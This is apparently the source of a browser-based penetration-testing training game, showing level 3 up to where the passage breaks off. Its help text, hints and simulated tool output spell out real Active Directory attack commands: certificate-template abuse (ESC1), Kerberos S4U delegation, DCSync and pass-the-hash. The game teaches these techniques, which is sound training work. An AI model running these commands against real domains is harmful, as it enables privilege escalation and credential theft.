<script>
// ============================================
// LEVEL 3: ELITE AD - Advanced Active Directory Attacks
// ADCS, Constrained Delegation, S4U, RBCD, Shadow Credentials
// ============================================

const LEVEL3_DOMAIN = {
  name: 'BLACKPEAK.LOCAL',
  dcIP: '10.10.50.10',
  caIP: '10.10.50.20',
  users: {
    'web_svc': { spn: 'HTTP/web01.blackpeak.local', constrained: ['cifs/dc01.blackpeak.local'], password: null },
    'sql_svc': { spn: 'MSSQLSvc/sql01.blackpeak.local:1433', constrained: null, password: null },
    'backup_admin': { spn: null, constrained: null, password: 'B@ckup2024!', groups: ['Backup Operators'] },
    'Administrator': { spn: null, constrained: null, password: null, groups: ['Domain Admins'] }
  },
  templates: {
    'User': { vulnerable: false },
    'WebServer': { vulnerable: true, esc: 'ESC1', enrollable: ['Domain Computers', 'Authenticated Users'] },
    'SubCA': { vulnerable: true, esc: 'ESC4', enrollable: ['Domain Admins'] }
  }
};

async function initLevel3() {
  gameState.levelState = {
    // Recon Phase
    enumDomain: false,
    bloodhoundRan: false,
    foundCA: false,
    enumTemplates: false,

    // ADCS Phase (ESC1)
    foundVulnTemplate: false,
    requestedCert: false,
    gotAdminCert: false,
    extractedNTHash: false,

    // Alternative Path - Constrained Delegation
    foundConstrainedDeleg: false,
    requestedTGT: false,
    performedS4U: false,
    gotServiceTicket: false,

    // DCSync
    dcsyncPerformed: false,
    krakenHash: null,

    // Win condition
    gotDomainAdmin: false,

    // State
    currentUser: 'web_svc',
    currentHost: 'WEB01',
    certificates: [],
    tickets: [],
    ntHashes: {}
  };

  clear();
  print('');
  print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'error');
  print('â•‘                        LEVEL 3: ELITE ACTIVE DIRECTORY                            â•‘', 'error');
  print('â•‘                     "Certificates of Mass Destruction"                            â•‘', 'warning');
  print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
  print('â•‘                                                                                   â•‘', 'info');
  print('â•‘                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                        â•‘', 'info');
  print('â•‘                    â”‚       BLACKPEAK.LOCAL               â”‚                        â•‘', 'info');
  print('â•‘                    â”‚    Enterprise Environment           â”‚                        â•‘', 'info');
  print('â•‘                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â•‘', 'info');
  print('â•‘                              â”‚                                                    â•‘', 'info');
  print('â•‘           â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                 â•‘', 'info');
  print('â•‘           â”‚                  â”‚                  â”‚                                 â•‘', 'info');
  print('â•‘      â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”                            â•‘', 'info');
  print('â•‘      â”‚  DC01   â”‚       â”‚  CA01    â”‚       â”‚  WEB01   â”‚                            â•‘', 'info');
  print('â•‘      â”‚ 10.10.  â”‚       â”‚ 10.10.   â”‚       â”‚ 10.10.   â”‚ â—„â”€â”€ YOU ARE HERE          â•‘', 'info');
  print('â•‘      â”‚  50.10  â”‚       â”‚  50.20   â”‚       â”‚  50.30   â”‚                            â•‘', 'info');
  print('â•‘      â”‚   [DC]  â”‚       â”‚ [AD CS]  â”‚       â”‚ [IIS]    â”‚                            â•‘', 'info');
  print('â•‘      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                            â•‘', 'info');
  print('â•‘                                                                                   â•‘', 'info');
  print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
  print('â•‘  FOOTHOLD: web_svc on WEB01 (service account, constrained delegation)            â•‘', 'success');
  print('â•‘  TARGET:   Domain Admin on BLACKPEAK.LOCAL                                       â•‘', 'warning');
  print('â•‘  INTEL:    AD CS (Certificate Services) deployed. Misconfigured templates?      â•‘', 'info');
  print('â•‘                                                                                   â•‘', 'info');
  print('â•‘  ATTACK PATHS:                                                                    â•‘', 'info');
  print('â•‘    [A] ADCS ESC1 - Vulnerable certificate template â†’ impersonate DA             â•‘', 'warning');
  print('â•‘    [B] Constrained Delegation - S4U2Self + S4U2Proxy â†’ DC access                â•‘', 'warning');
  print('â•‘    [C] Shadow Credentials - Add msDS-KeyCredentialLink â†’ auth as target         â•‘', 'warning');
  print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'error');
  print('');

  await typeText('[BRIEFING] You have compromised web_svc - a service account on WEB01', 30, 'system');
  await typeText('[BRIEFING] AD CS is deployed. Certificate misconfigurations are common.', 30, 'system');
  await typeText('[BRIEFING] Your account has constrained delegation to DC01.', 30, 'warning');
  await typeText('[BRIEFING] Multiple paths to DA exist. Choose wisely.', 30, 'info');
  print('');

  updateHUD('3 - Elite AD', 'BLACKPEAK.LOCAL', 'Domain Admin via ADCS/Delegation', 0);
  setPrompt('web_svc', 'WEB01', 'C:\\');
}

async function handleLevel3Command(cmd, args) {
  const state = gameState.levelState;
  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // HELP COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'help') {
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                            LEVEL 3 COMMANDS                                      â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  RECONNAISSANCE:                                                                 â•‘', 'info');
    print('â•‘    bloodhound-python -d <domain> -u <user> -p <pass> -c all                     â•‘', 'system');
    print('â•‘    bloodhound                   Analyze BloodHound data (after collection)      â•‘', 'system');
    print('â•‘    ldapsearch <filter>          Query LDAP for objects                          â•‘', 'system');
    print('â•‘    net user /domain             List domain users                               â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  AD CS (CERTIFICATE ATTACKS):                                                    â•‘', 'error');
    print('â•‘    certipy find -u <user> -p <pass> -dc-ip <ip>   Enumerate CA & templates     â•‘', 'warning');
    print('â•‘    certipy req -u <user> -p <pass> -ca <ca> -template <t> -upn <target>       â•‘', 'warning');
    print('â•‘    certipy auth -pfx <cert.pfx>                   Auth with certificate        â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  KERBEROS ATTACKS:                                                               â•‘', 'info');
    print('â•‘    rubeus asktgt /user:<u> /rc4:<hash>            Request TGT                   â•‘', 'system');
    print('â•‘    rubeus s4u /ticket:<b64> /impersonateuser:<u> /msdsspn:<spn>  S4U attack   â•‘', 'success');
    print('â•‘    rubeus describe /ticket:<b64>                  Analyze ticket                â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  CREDENTIAL ATTACKS:                                                             â•‘', 'info');
    print('â•‘    impacket-secretsdump <domain>/<user>@<dc>      DCSync (needs Repl rights)   â•‘', 'warning');
    print('â•‘    mimikatz                                       Credential theft              â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  SHADOW CREDENTIALS:                                                             â•‘', 'info');
    print('â•‘    pywhisker -d <domain> -u <user> -p <pass> --target <user> --action add      â•‘', 'warning');
    print('â•‘    gettgtpkinit.py <domain>/<target> -cert-pfx <pfx>  Auth via shadow cred    â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  LATERAL MOVEMENT:                                                               â•‘', 'info');
    print('â•‘    impacket-psexec <domain>/<user>@<target> -hashes :<ntlm>                    â•‘', 'system');
    print('â•‘    evil-winrm -i <ip> -u <user> -H <ntlm>                                       â•‘', 'system');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘  UTILITY:                                                                        â•‘', 'info');
    print('â•‘    status                       Show progress                                   â•‘', 'success');
    print('â•‘    hint                         Get contextual hint                             â•‘', 'warning');
    print('â•‘    tickets                      List obtained Kerberos tickets                  â•‘', 'system');
    print('â•‘    certs                        List obtained certificates                      â•‘', 'system');
    print('â•‘    exit                         Return to main menu                             â•‘', 'system');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // STATUS COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'status') {
    const progress = calculateLevel3Progress(state);
    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘               LEVEL 3 PROGRESS - ELITE AD                        â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  RECONNAISSANCE:                                                 â•‘', 'info');
    print(`â•‘    [${state.enumDomain ? 'âœ“' : ' '}] Domain enumerated                                  â•‘`, state.enumDomain ? 'success' : 'system');
    print(`â•‘    [${state.foundCA ? 'âœ“' : ' '}] Certificate Authority discovered                    â•‘`, state.foundCA ? 'success' : 'system');
    print(`â•‘    [${state.enumTemplates ? 'âœ“' : ' '}] Certificate templates enumerated                  â•‘`, state.enumTemplates ? 'success' : 'system');
    print('â•‘                                                                  â•‘', 'info');
    print('â•‘  PATH A - ADCS ATTACK:                                           â•‘', 'warning');
    print(`â•‘    [${state.foundVulnTemplate ? 'âœ“' : ' '}] Vulnerable template identified (ESC1)            â•‘`, state.foundVulnTemplate ? 'success' : 'system');
    print(`â•‘    [${state.gotAdminCert ? 'âœ“' : ' '}] Admin certificate obtained                         â•‘`, state.gotAdminCert ? 'success' : 'system');
    print(`â•‘    [${state.extractedNTHash ? 'âœ“' : ' '}] NT hash extracted from certificate                â•‘`, state.extractedNTHash ? 'success' : 'system');
    print('â•‘                                                                  â•‘', 'info');
    print('â•‘  PATH B - CONSTRAINED DELEGATION:                                â•‘', 'warning');
    print(`â•‘    [${state.foundConstrainedDeleg ? 'âœ“' : ' '}] Constrained delegation found                     â•‘`, state.foundConstrainedDeleg ? 'success' : 'system');
    print(`â•‘    [${state.performedS4U ? 'âœ“' : ' '}] S4U2Self + S4U2Proxy performed                    â•‘`, state.performedS4U ? 'success' : 'system');
    print(`â•‘    [${state.gotServiceTicket ? 'âœ“' : ' '}] Service ticket for DC obtained                    â•‘`, state.gotServiceTicket ? 'success' : 'system');
    print('â•‘                                                                  â•‘', 'info');
    print('â•‘  FINAL:                                                          â•‘', 'info');
    print(`â•‘    [${state.dcsyncPerformed ? 'âœ“' : ' '}] DCSync performed                                   â•‘`, state.dcsyncPerformed ? 'success' : 'system');
    print(`â•‘    [${state.gotDomainAdmin ? 'âœ“' : ' '}] DOMAIN ADMIN ACHIEVED                              â•‘`, state.gotDomainAdmin ? 'success' : 'system');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print(`â•‘  Progress: ${String(progress).padStart(3)}%                                                â•‘`, progress === 100 ? 'success' : 'warning');
    print(`â•‘  Current: ${state.currentUser}@${state.currentHost}                               â•‘`, 'system');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');
    updateHUD('3 - Elite AD', 'BLACKPEAK.LOCAL', 'Domain Admin', progress);
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // HINT COMMAND
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'hint') {
    print('');
    print('ğŸ’¡ HINT:', 'warning');

    if (!state.enumDomain) {
      print('Start with domain enumeration. BloodHound is your friend.', 'info');
      print('Try: bloodhound-python -d blackpeak.local -u web_svc -p <pass> -c all', 'success');
    } else if (!state.foundCA) {
      print('Look for AD CS (Certificate Services) in the domain.', 'info');
      print('Try: certipy find -u web_svc -dc-ip 10.10.50.10', 'success');
    } else if (!state.foundVulnTemplate && !state.foundConstrainedDeleg) {
      print('Analyze certipy output or BloodHound for attack paths:', 'info');
      print('  - ESC1: Template allows user-supplied SAN', 'warning');
      print('  - Constrained Delegation: web_svc can delegate to cifs/dc01', 'warning');
      print('Try: bloodhound (then query for delegation)', 'success');
    } else if (state.foundVulnTemplate && !state.gotAdminCert) {
      print('ESC1: Request a certificate with Administrator UPN!', 'info');
      print('Try: certipy req -u web_svc -ca BLACKPEAK-CA -template WebServer -upn Administrator@blackpeak.local', 'success');
    } else if (state.gotAdminCert && !state.extractedNTHash) {
      print('Use the certificate to authenticate and get the NT hash.', 'info');
      print('Try: certipy auth -pfx administrator.pfx', 'success');
    } else if (state.foundConstrainedDeleg && !state.performedS4U) {
      print('Perform S4U attack to impersonate Administrator to DC01.', 'info');
      print('First get a TGT: rubeus asktgt /user:web_svc /rc4:<hash>', 'info');
      print('Then S4U: rubeus s4u /ticket:<tgt> /impersonateuser:Administrator /msdsspn:cifs/dc01.blackpeak.local', 'success');
    } else if (state.extractedNTHash || state.gotServiceTicket) {
      print('You have DA credentials! Use them to access DC01.', 'info');
      print('Try: impacket-psexec blackpeak.local/Administrator@10.10.50.10 -hashes :<hash>', 'success');
      print('Or perform DCSync: impacket-secretsdump blackpeak.local/Administrator@10.10.50.10 -hashes :<hash>', 'success');
    } else {
      print('Verify Domain Admin access with whoami /groups', 'info');
    }
    print('');
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // BLOODHOUND COLLECTION
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'bloodhound-python') {
    await simulateLoading('Collecting BloodHound data', 4000);
    print('');
    print('[*] BloodHound.py - Active Directory Reconnaissance', 'system');
    print('[*] Domain: BLACKPEAK.LOCAL', 'system');
    print('[*] Collecting: Users, Groups, Computers, ACLs, Trusts, Sessions', 'system');
    print('');
    print('[+] Found 847 users', 'system');
    print('[+] Found 52 groups', 'system');
    print('[+] Found 23 computers', 'system');
    print('[+] Found 1 domain', 'system');
    print('[+] Found 3 OUs', 'system');
    print('[+] Found 12 GPOs', 'system');
    print('[+] Found 1 Certificate Authority', 'success');
    print('[+] Found 15 Certificate Templates', 'success');
    print('');
    print('[+] Data exported to bloodhound.zip', 'success');
    print('[*] Run "bloodhound" to analyze the data', 'info');

    state.bloodhoundRan = true;
    state.enumDomain = true;
    state.foundCA = true;
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // BLOODHOUND ANALYSIS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'bloodhound') {
    if (!state.bloodhoundRan) {
      print('[!] Run bloodhound-python first to collect data', 'warning');
      return;
    }

    print('');
    print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
    print('â•‘                         BLOODHOUND ANALYSIS                                      â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  SHORTEST PATH TO DOMAIN ADMIN:                                                  â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•‘    web_svc â”€â”€[AllowedToDelegate]â”€â”€â–¶ DC01 (cifs service)                         â•‘', 'success');
    print('â•‘    â”‚                                    â”‚                                        â•‘', 'info');
    print('â•‘    â”‚                                    â””â”€â”€â–¶ S4U2Proxy to impersonate DA        â•‘', 'success');
    print('â•‘    â”‚                                                                             â•‘', 'info');
    print('â•‘    â””â”€â”€[EnrollmentRights]â”€â”€â–¶ WebServer Template (ESC1)                           â•‘', 'success');
    print('â•‘                                  â”‚                                               â•‘', 'info');
    print('â•‘                                  â””â”€â”€â–¶ Request cert with DA SAN                  â•‘', 'success');
    print('â•‘                                                                                  â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  HIGH VALUE TARGETS:                                                             â•‘', 'warning');
    print('â•‘    Administrator (Domain Admin, Enterprise Admin)                               â•‘', 'error');
    print('â•‘    backup_admin (Backup Operators - DCSync potential)                           â•‘', 'warning');
    print('â•‘    krbtgt (Golden Ticket creation)                                              â•‘', 'error');
    print('â•‘                                                                                  â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  CERTIFICATE AUTHORITY:                                                          â•‘', 'success');
    print('â•‘    CA01.BLACKPEAK.LOCAL (10.10.50.20)                                           â•‘', 'system');
    print('â•‘    Templates: User, WebServer, SubCA, DomainController...                       â•‘', 'system');
    print('â•‘    [!] Run certipy find for detailed template analysis                          â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
    print('â•‘  KERBEROS DELEGATION:                                                            â•‘', 'success');
    print('â•‘    web_svc â”€â”€ Constrained Delegation â”€â”€â–¶ cifs/dc01.blackpeak.local             â•‘', 'warning');
    print('â•‘                                                                                  â•‘', 'info');
    print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
    print('');

    state.foundConstrainedDeleg = true;
    addEasterEgg('lvl3_bloodhound', 'The bloodhound sees all paths...');
    autosave();
    return;
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // CERTIPY - AD CS ENUMERATION & ATTACKS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (cmd === 'certipy') {
    const action = args[0];

    // FIND - Enumerate CA and templates
    if (action === 'find') {
      if (!state.enumDomain) {
        print('[!] Enumerate domain first with bloodhound-python', 'warning');
        return;
      }

      await simulateLoading('Enumerating AD CS', 3000);
      print('');
      print('Certipy v4.7.0 - AD CS Enumeration', 'system');
      print('');
      print('[*] Finding certificate templates...', 'system');
      print('[*] Finding certificate authorities...', 'system');
      print('');
      print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'info');
      print('â•‘                    CERTIFICATE AUTHORITY                                 â•‘', 'info');
      print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'info');
      print('â•‘  CA Name:           BLACKPEAK-CA                                         â•‘', 'system');
      print('â•‘  DNS Name:          CA01.BLACKPEAK.LOCAL                                 â•‘', 'system');
      print('â•‘  Certificate:       CN=BLACKPEAK-CA, DC=BLACKPEAK, DC=LOCAL             â•‘', 'system');
      print('â•‘  Web Enrollment:    Enabled                                              â•‘', 'warning');
      print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'info');
      print('');
      print('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—', 'error');
      print('â•‘                    VULNERABLE TEMPLATES                                  â•‘', 'error');
      print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
      print('â•‘                                                                          â•‘', 'info');
      print('â•‘  Template: WebServer                                                     â•‘', 'warning');
      print('â•‘  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â•‘', 'info');
      print('â•‘    [!] ESC1: ENROLLEE_SUPPLIES_SUBJECT                                   â•‘', 'error');
      print('â•‘    - Enrollment Rights: Domain Computers, Authenticated Users           â•‘', 'success');
      print('â•‘    - Client Authentication: True                                         â•‘', 'warning');
      print('â•‘    - Allows SAN (Subject Alternative Name): True                         â•‘', 'error');
      print('â•‘                                                                          â•‘', 'info');
      print('â•‘    ATTACK: Request certificate with Administrator UPN in SAN            â•‘', 'error');
      print('â•‘    certipy req -u web_svc -ca BLACKPEAK-CA -template WebServer \\        â•‘', 'success');
      print('â•‘              -upn Administrator@blackpeak.local                          â•‘', 'success');
      print('â•‘                                                                          â•‘', 'info');
      print('â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£', 'error');
      print('â•‘                                                                          â•‘', 'info');
      print('â•‘  Template: SubCA                                                         â•‘', 'warning');
      print('â•‘  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â•‘', 'info');
      print('â•‘    [!] ESC4: Write Access to Template                                    â•‘', 'warning');
      print('â•‘    - Owner: Domain Admins                                                â•‘', 'system');
      print('â•‘    - Not directly exploitable from current access                        â•‘', 'system');
      print('â•‘                                                                          â•‘', 'info');
      print('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'error');
      print('');

      state.enumTemplates = true;
      state.foundVulnTemplate = true;
      playAlert();
      autosave();
      return;
    }

